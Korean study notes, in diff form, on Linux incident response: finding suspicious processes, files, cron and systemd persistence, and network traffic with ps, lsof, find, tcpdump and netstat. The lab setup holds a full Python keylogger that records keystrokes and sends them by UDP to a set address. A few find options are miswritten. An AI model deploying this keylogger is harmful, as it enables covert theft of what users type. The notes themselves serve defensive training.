@@ -1,0 +1,394 @@
+### 공격 정황 탐색 ###
+
+## 들어가며 ##
+-> Linux 시스템에 공격자가 침투했다고 가정하며, 침해사고 대응 방법에 대해 배워보기.
+
+*침해사고
+-> 사이버 공격 행위에 따라 나타난 여러 종류의 피해
+-> 컴퓨터 바이러스나 서비스 거부 공격 등으로 피해를 입은 경우를 통칭
+
+*침해사고 분석
+STEP 1) 악성 프로세스가 있는 지 판단
+STEP 2) 악성 코드로 의심되는 수상한 파일이 시스템 내에 존재하는 지 검색
+STEP 3) 네트워크 분석을 통해 외부와의 통신 살펴보기.
+
+## 프로세스 분석 ##
+
+# 실습 환경 구성 #
+-> 게스트 PC에 키로거 스크립트 제작.
+# /usr/bin/python3
+# keylogger.py
+
+import keyboard
+import socket
+import threading
+import os
+from time import sleep
+
+# NEED TO CHANGE!!!!!
+YOUR_IPADDR = "192.168.0.1"     # Change this to SAFE IP address!
+YOUR_PORT = 12345               # Change this to SAFE port
+
+# key event handler
+def on_key_event(event):
+    # save to the file
+    with open("keylog.txt", "a") as f:
+        f.write(f"{str(event)} ")
+
+# send file to external server
+def send_file_contents():
+    while True:
+
+        # sleep 5 seconds
+        sleep(5)
+          
+        # create socket
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) -> IPv4와 UDP 사용.
+        
+        # read file
+        with open("keylog.txt", "r") as f:
+            file_contents = f.read()
+
+        # send file contents
+        client_socket.sendto(file_contents.encode(), (YOUR_IPADDR, YOUR_PORT))
+        
+        # clear buffer
+        os.system("rm keylog.txt && touch keylog.txt")
+
+# create 'keylog.txt'
+os.system("touch keylog.txt")
+
+# register keyboard event listener 
+keyboard.hook(on_key_event) -> 모든 키 입력을 on_key_event로 전달.
+
+# start the thread which send file contents to external server
+file_thread = threading.Thread(target=send_file_contents)
+file_thread.daemon = True
+file_thread.start()
+
+# To quit the process, press Ctrl+C
+keyboard.wait()
+
+-> 키 입력을 감지하고 파일에 기록하는 간단한 keylogger
+-> 이후, 특정 IP 주소와 포트로 주기적으로 전송.
+
+-> 게스트 PC에서 tcpdump 명령어 실행하였을 때 5초에 한 번씩 내가 입력한 IP 주소로 UDP 패킷이 전송되고 있다면 정상적으로 환경 구성한 것임.
+*tcpdump
+-> 해당 PC에서 주고 받는 패킷을 출력하거나 덤프하는 명령어 (UDP 패킷 전송 확인.)
+
+
+# 프로세스 식별 #
+-> 현재 실행 중인 프로세스 식별을 하기 위해서는 ps 명령어 이용. (ps -ef, ps -aux 자주 사용)
+: -e ; 모든 프로세스
+: -f ; ful-format으로 출력
+: -a ; 콘솔(tty)로 실행된 모든 프로세스
+: -u ; 사용자 정보를 자세히
+: -x ; 콘솔로 실행되지 않은 프로세스
+
+-> 침해사고 대응 과정에서는 프로세스 전체 목록을 보며 수상한 프로세스를 찾기도 하지만, 프로세스 이름을 알고 있다면 grep을 통해 필터링함.
+-> ps -ef와 ps -aux 모두 PID, 시작 시간, 실행 커맨드를 알 수 있음.
+-> ps -aux에서는 CPU 및 메모리 사용량(%CPU, %MEM), 가상 및 실제 메모리 크기(VSZ, RSS), 프로세스 상태(STAT) 등을 추가로 알 수 있음.
+-> STAT 필드 ; S+: 프로세스 실행 중, Ss: 프로세스가 세션 리더이며 대기중, Sl+: 프로세스가 멀티 스레딩 지원하는 메인 스레드 상태 
+
+"지나치게 CPU 사용량 및 메모리 사용량이 높은 프로세스는 의심해야함"
+
+# 프로세스 관련 파일 확인 #
+-> lsof ; 프로세스가 실행 중에 열고 있는 파일 확인
+
+- lsof -u [User]: 특정 사용자 지정
+- lsof -u ^[User]: 특정 사용자 제외
+- lsof -p [Process]: 특정 프로세스 지정
+- lsof -i [TCP:port]: TCP에서 특정 포트를 이용하는 프로세스 출력
+- lsof [FilePath]: 특정 파일을 열고 있는 프로세스 출력
+- lsof +D [DirectoryPath]: 특정 폴더를 열고 있는 프로세스 출력
+
+-> lsof 명령어 실행해보면 키로거 실행 파일은 /home/hunjison/Temp에서 로그 파일을 생성하므로 해당 디렉토리를 열고있음
+-> Linux에서는 장치 파일과 네트워크 소켓도 파일 형태로 관리하기에 함께 확인 가능.
+-> 실습에서는 /dev/input 장치 파일과 UDP 소켓 (48884 포트) 역시 해당 프로세스가 열 고 있음.
+
+# 프로세스 함수 호출 확인 #
+-> 해당 프로세스가 실행하는 함수를 파악해야 프로세스의 행위를 파악할 수 있음.
+-> strace: 프로그램이 실행되는 동안 수행되는 시스템 함수 추적.
+: -p 옵션 이용하면 특정 프로세스에 attach하여 시스템 함수 추적 가능
+-> ltrace: 동적 라이브러리 함수 호출
+: -p 옵션 이용하면 특정 프로세스에 attach하여 동적 라이브러리 내 함수 호출 가능
+
+# 프로세스 내 문자열 확인 #
+-> 프로그램 내 존재하는 문자열 추출 가능
+-> strings
+
+## 파일 검색 ##
+-> Linux 시스템 내부에서 조건에 맞는 파일이나 폴더를 검색하는 find 명령어
+-> 원하는 조건의 파일 검색 가능
+: -P ; 심볼릭 링크를 따라 가지 않고 심볼링 링크 자체 정보 이용
+: -L ; 심볼릭 링크에 연결된 파일 정보 이용
+: -name ; 파일 이름으로 찾기
+: -type ; 파일 타입으로 찾기
+: -size ; 파일 크기로 찾기
+: -perm ; 파일 권한으로 찾기
+: -mtime, -ctime, -atime ; 파일 시간 기반으로 찾기
+
+# 파일 이름으로 찾기 #
+Ex) find /home -name "*.py" -not -path "/home/hunjison/.local/*"
+
+# 정규표현식으로 찾기 #
+Ex) find /home -regex ".*/key[a-z]+[.]py"
+
+*** 정규표현식 ***
+1. 매치
+: 문자 혹은 문자열
+: . ; 모든 문자와 매치 ; d.eamhack ; Hello 'dxeamhack'
+: | ; 앞 또는 뒤의 패턴과 매치 ; hi|dream -> Hello 'dream'hack
+: [] ; [] 안의 문자와 매치 ; [aeiou] -> H'i'
+: [^ ] ; [^ ] 뒤의 패턴을 제외한 나머지와 매치 ; [^aeiou] -> 'H'i
+: ^ ; 어떤 문자열의 시작이 특정 패턴인 경우 매치 ; ^dream -> 'dream'hack Hello
+: $ ; 어떤 문자열의 끝이 특정 패턴인 경우 매치 ;  $hack -> Hello dream'hack'
+: \ ; \ 뒤의 특수 문자와 매치 ; hack\$ -> Hello dream'hack$'
+: [a-z], [A-Z], [0-9] ; 두 문자 사이 범위의 문자와 매치 ; [b-d] -> ha'c'k
+: \w ; 알파벳 또는 숫자 또는 _와 매치 [A-Za-z0-9_] ; \w -> 'a'!
+: \d ; 숫자와 매치 [0-9] ; \d -> a'1'
+: \s ; 공백 문자와 매치 [\b\f\n\r\t\v]
+
+2. 수량자 
+: * ; 바로 앞에 나온 문자가 0개 이상이면 매치 ; Hac*k -> 'Hak', 'Hack'
+: + ; 바로 앞에 나온 문자가 1개 이상이면 매치 ; Hac+k -> 'Hack' 
+: ? ; 바로 앞에 나온 문자가 0개 또는 1개이면 매치 ; Hac?k -> 'Hak', 'Hack'
+: 수랑자? ; 최소한의 문자만 매치 ; Hack+? -> Hack 으로 끝.
+: {n} ; 앞에 나온 문자가 정확히 n개이면 매치 ; Hac{3}k -> Haccck
+: {n, } ; 앞에 나온 문자가 n개 이상이면 매치 ; Hac{2,}k -> Haccck
+: {a,b} ; 앞에 나온 문자가 a개 이상 b개 이하면 매치 ; Hac{2,3}k -> Hacck
+
+3. 그룹화
+: () ; 하나의 문자처럼 여김. ; (ha) + ck -> hahack.
+
+4. 정규 표현식 플래그
+-> 검색의 옵션 지정 (/패턴/플래그)
+: g ; 매치하는 모든 문자/문자열 검색 ; /[aeiou]/ -> H'e'llo dreamhack, /[aeiou]/g -> H'e'll'o' dr'e''a'mh'a'ck
+: i ; 대소문자 구분하지 않고 검색 ; /h/g -> Hello dream'h'ack, /h/ig -> 'H'ello dream'h'ack
+: m ; 여러 줄에서 검색 ; /^Hello/g -> 'Hello' dream \n Hello hack, /^Hello/gm -> 'Hello' dream, 'Hello' hack
+: s ; 메타문자 .가 개행문자도 포함 ; /Hello.+hack/g -> Hello dream \n 'Hello hack', /Hello.+hack/s -> 'Hello dream \n Hello hack'
+
+** 파이썬 정규 표현식 -1 **
+1. re.compile(pattern, flags) ; 정규 표현식 패턴을 컴파일 ; 패턴 객체를 반환
+2. re.search(pattern, string, flags) ; 문자열 내에서 패턴에 처음으로 매치하는 문자열 검색 ; 매치하는 문자열 있으면 문자열 객체 반환 (없으면 None 반환)
+3. re.match(pattern, string, flags) ; 문자열 시작 부분에서 패턴에 매치하는 문자열 검색
+4. re.fullmatch(pattern, string, flags) ; 전체 문자열이 패턴과 정확하게 매치하는지 확인
+5. re.findall(pattern, string, flags) ; 문자열 내에서 패턴에 매치하는 모든 문자열 검색, 리스트 형식으로 반환 (인덱스로 접근 가능)
+6. re.finditer(pattern, string, flags) ; 
+
+** 파이썬 정규 표현식 -2 **
+1. re.I, re.M, re.S, (g는 디폴트 적용)
+-> 인라인으로는 (?i), (?m), (?s)
+
+2. Raw String (r) ; print(r'\t'+'Hi') -> \tHi
+
+* .과 \.은 아무 문자와 진짜 .의 차이임
+
+** 예제 **
+^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$
+-> @바로 앞에서는 알파벳, 숫자, _, -,. 중 하나 이상이 반복되어야함
+-> @뒤에는 알파벳, 숫자, _, -가 하나 이상 반복 되고 이후 .이 온다 (그룹화 되어있기때문에 반복 가능)
+-> 이후 2개에서 4개까지 알파벳, 숫자, _, -가 와야함.
+
+
+Q) 정규표현식 연습. /home 경로 내의 모든 파일 및 폴더에서 숨겨진 파일만을 검색하려면 어떻게 해야할까?
+-> find /home -regex ".*/\.[^/]*"
+-> 아무문자나 반복되고 /로 구분됨
+-> .이 오고
+-> /면 안되니까 (마지막은 파일이나 디렉토리로 끝나야하니까) 그거 제외하고 오도록함.
+
+# 파일 타입과 크기로 찾기 #
+-> find /home -name "*Temp*" -type d ; Temp 문자열이 포함된 디렉터리 검색한 것
+-> d는 디렉터리, f는 파일, l은 심볼릭 링크
+
+-> find /home/minhyuk/Temp -size 33c (33Byte 인 것 찾기), c는 바이트
+-> find /home/minhyuk/Temp -size +10k (10KB 이상인 파일 찾기), k는 킬로바이트
+-> find /home/minhyuk/Temp -size -1024c (1024Byte 이하인 파일 찾기)
+
+# 파일 권한으로 찾기 #
+-> -perm 옵션 이용
+-> 의심스러운 것들
+- root에 대해 setuid같은 특수 권한 설정되어 있는 경우
+Ex) rwsr-xr-x (4655)
+
+- root 권한의 실행 권한이 설정되어 있는 경우
+Ex) rwxr-xr-x (0755)
+
+0644 에서 필드는 ..
+특수 권한 | 소유자(root) 권한 | 그룹 권한 | 사용자 권한
+특수 권한에서 (4는 실행 시 소유자 권한, 2는 실행 시 그룹 권한, 1은 sticky bit로 root와 소유자 제외 삭제 및 이름 변경 불가)
+
+-> sudo find / -perm -4000 2>/dev/null (-를 붙임으로써 권한 기준으로 파일 검색)
+* 2>/dev/null은 표준 에러를 버리겠다. (에러 메시지를 출력하지 않겠다.)
+
+# 파일 시간 기반으로 찾기 #
+-> 디지털 포렌식은 특정 시간에 일어난 사용자의 행위를 재구성 하는 것.
+-> 특정 시간에 어떤 일이 일어났는 지 파악하는 것이 중요.
+-> Linux 시스템에서는 총 3가지의 파일 시간이 존재.
+-> mtime (파일의 마지막 변경 시간), atime (파일의 마지막 접근 시간), ctime (파일의 메타데이터가 마지막으로 변경된 시간)
+
+-> stat 명령어로 MAC Timestamp 조회 가능 (MAC은 mtime, atime, ctime의 앞글자 딴거임)
+-> Ex) stat keylog.txt
+
+-> find에서 -mtime, -atime, -ctime으로 시점 줄 수 있음.
+-> find / -type f -mtime -10 (현재 기준 10일 이내에 마지막으로 변경된 파일)
+-> find / -type f -mtime 10 (현재 기준 11~10일 시점에 마지막으로 변경된 파일)
+-> find / -type f -mtime +10 (현재 기준 11일보다 더 과거에 마지막으로 변경된 파일)
+
+* Modify 와 Change의 차이는 (데이터 내용 수정과 메타데이터 수정의 차이)
+
+-> newermy 옵션으로 기준 시간을 정해줄 수 있음.
+-> find / -type f -newermy "2024-04-13 00:00:00" ; 해당 시간 이후에 수정된 파일
+-> find / -type f +newermy "2024-04-13 00:00:00" ; 해당 시간 이전에 수정된 파일
+
+## 자동 실행 ##
+-> 별도의 실행 과정 없이도 시스템에서 자동으로 실행되는 것.
+-> cron: 정해진 시간이 되면 자동으로 정해진 작업 수행하는 놈.
+-> 스크립트: 시스템이 부팅될 때 자동으로 실행되는 놈.
+-> 디지털 포렌식에서 중요한 이유는 공격자들이 악성코드를 은닉할 가능성이 높음
+-> 공격자들이 시스템에 성공적으로 침투한 후 ..
+-> 지속적으로 시스템에 대한 권한을 유지하고자 자동 실행 파일을 이용
+-> 자동 실행 파일은 명령어를 실행하지 않아도 시스템 내에서 자동으로 실행되는 성질이 있음
+
+# cron #
+-> Linux 시스템의 시간 기반 잡 스케줄러
+-> cron에 등록된 작업을 조회, 편집하기 위해서는 crontab 명령어 이용.
+[minutes] [hour] [day] [month] [week] [command]
+0~59	  0~23  1~31  1~12   0~6(요일)   별도 없음.
+-> 0/5 (0부터 5마다, 예를 들어..0부터 5시간 마다)
+-> 0-5 (0부터 5까지, 예를 들어..0시부터 5시까지)
+
+-> crontab -e ; 작업 등록
+-> crontab -l ; 작업 조회
+
+-> 0 0/5 * * * /bin/sh # 매일 0시부터 5시간 마다 실행
+-> 0 0 21 * * /bin/sh # 매달 21일에 실행
+-> 0 0-5 10 * * /bin/sh # 매달 10일에 0시부터 5시 정각에 실행
+-> 0 0 * * 1 /bin/ # 매달 매주 월요일에 0시 0분에 실행
+
+-> 시스템 전반에 동작하는 cron은 /etc/crontab에서 확인 가능
+-> 실제 수행되는 작업들은 /etc/cron.daily와 같은 경로에 나누어 저장됨.
+-> 해당 폴더에 가보면 작업을 수행하는 스크립트 존재함.
+-> 디지털 포렌식 과정에서 이러한 경로들에 숨겨진 파일이 없는 지 찾아볼 필요가 있음.
+
+# 부팅 시 자동 실행 #
+-> 시스템 부팅 시에는 /etc/systemd 내에 정의된 서비스가 자동으로 실행.
+-> 필드
+1. After - 이 Unit보다 먼저 실행되어야 할 Unit들 나타냄
+2. ExecStartPre - 서비스를 실행하기 전에 실행되는 명령어
+3. ExecStart - 서비스를 실행하는 명령어
+4. RuntimeDirectory - 서비스가 실행되는 디렉토리
+
+-> 시스템 부팅 과정에서 /etc/systemd 폴더 내에 정의된 모든 서비스 실행
+-> 서비스 중에서 의심스러운 스크립트나 환경 변수, 라이브러리 등이 포함되었는 지 확인해야됨.
+
+# 로그인 시 자동 실행 #
+-> 사용자가 로그인 혹은 로그아웃할 때 자동으로 실행되는 파일.
+1. /etc/profile ; 모든 사용자가 로그인할 때 (시스템 계정 전반에 대한 설정 파일)
+2. ~/.profile ; 각각의 사용자가 로그인할 때 (개별 사용자에 대한 설정 파일. /etc/profile 보다 우선적 적용)
+3. ~/.bash_profile ; bash 쉘로 로그인 할 때 (bash 쉘에서의 로그인 스크립트)
+4. ~/.bashrc ; 새로운 bash 터미널 창을 열 때 (bash 쉘 터미널 설정 파일)
+5. ~/.bash_logout ; bash 쉘에서 로그아웃할 때 (bash 쉘에서의 로그아웃 스크립트)
+
+-> 5가지 파일은 bash 스크립트로 이루어져있음
+
+## 네트워크 분석 ##
+
+# 네트워크 패킷 수집 #
+-> Linux 시스템이 악성 코드에 감염되면 외부로 포트를 열어 허가되지 않는 접속을 허용하는 경우가 많음
+-> ip addr로 현재 PC의 네트워크 인터페이스와 IP 조사함. (eth0 인터페이스로 172.23.91.136) 이용
+-> 환경에 따라 네트워크 인터페이스 별로 서로 다른 IP 대역을 라우팅할 수 있으므로 ip route로 한번 더 확인
+default via 172.23.80.1 dev eth0 proto kernel
+-> 인터넷과 같은 네트워크로 나갈 때는 172.23.80.1로 가서 eth0이 처리해줌 (kernel이 생성한거임)
+172.23.80.0/20 dev eth0 proto kernel scope link src 172.23.91.136
+-> 로컬 끼리의 트래픽은 172.23.91.136에 모여서 eth0이 처리해줌. (이것도 커널이 생성.)
+
+-> 현재 시스템이 외부와 주고 받는 네트워크 패킷을 수집하려면 tcpdump 사용
+"tcpdump -i [네트워크_인터페이스] -vv -w [파일이름] [표현식]"
+- i: 네트워크 인터페이스 입력
+- vv: 자세하게 출력
+- w: 원본 패킷을 지정한 파일로 저장
+- 표현식: 필터링
+
+- tcpdump tcp ; TCP 패킷만 수집
+- tcpdump src 192.168.0.179 ; 출발지가 192.168.0.179인 패킷만 수집
+- tcpdump tcp dst 192.168.0.179 ; 도착지가 192.168.0.179인 패킷 수집
+- tcpdump host 192.168.0.179 ; 호스트가 192.168.0.179인 패킷 수집 (호스트는 src와 dst 포함)
+- tcpdump tcp and dst port 80 ; TCP 면서 목적지 포트가 80인 패킷 수집
+
+# 네트워크 패킷 분석 #
+-> sudo tcpdump -i any -w ~/sample.pcap
+-> 최대한 많이 쌓은 후 종료.
+-> scp [원격계정]@[원격IP]:[원격 경로] [로컬 경로] 로 파일 가져옴
+-> 패킷 분석의 주요 정보인 IP, 포트, TCP flags, HTTP 확인 가능
+
+*필터링
+1. tcp
+2. udp
+3. tcp.port == 80
+4. ip.src == 192 . . . && ip.dst == 172 . . . 
+5. ip.addr == 192 . . . -> IP가 src 혹은 dst인 패킷
+6. tcp.flags.syn == 1 && tcp.flags.ack == 0 ; TCP syn 플래그는 1이면서 ack 플래그는 0인 패킷 -> TCP 3-way handshake 첫 번째 패킷을 식별하는 필터
+
+# 패킷 분석 팁 #
+-> 따라가기 기능. (이어지는 통신 과정 중 연결되는 패킷들을 하나의 창에서 보여줌.) ; 여러 패킷 분석할 때 유용
+-> 내보내기 기능 (파일 -> 객체 내보내기 -> HTTP) ; HTTP 통신에 포함된 객체들을 다운로드 가능. ; 인터넷을 이용하면서 생성된 이미지, 아이콘, 자바스크립트와 같은 캐시 파일들을 내보내기로 다운로드 가능
+
+# 프로세스 파악 #
+-> netstat ; 네트워크 연결 상태, 라우팅 테이블, 인터페이스 상태 등을 보여줌. (프로세스와 네트워크를 연결지어 검색 가능)
+-> wireshark를 이용한 패킷 분석에서 특정 IP 혹은 port와 같은 수상한 외부 연결 상태를 확인했다면, netstat 명령어로 특정 프로세스와 연결할 수 있다.
+-> 시스템 분석을 통해 수상한 프로세스 먼저 특정하고, 해당 프로세스의 네트워크 연결을 추적해 Wireshark를 이용해 패킷 분석 가능.
+
+: -a -> 연결 가능한(listening) 소켓과 연결 가능하지 않은(unlistening) 소켓을 모두 출력.
+: -p -> 소켓에 연결된 프로세스와 PID 출력
+: -n -> 호스트, 포트를 숫자 형태로 출력
+: -t -> TCP 소켓을 출력
+: -u -> UDP 소 켓을 출력
+
+"sudo netstat -antp"
+-> ps -ef | grep keylogger 와 같은 특정 프로세스 PID를 알아내고
+-> 해당 PID를 통해 netstat -anp | grep PID 로 어떤 통신(UDP, TCP) 하는 알아낼 수 있음.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
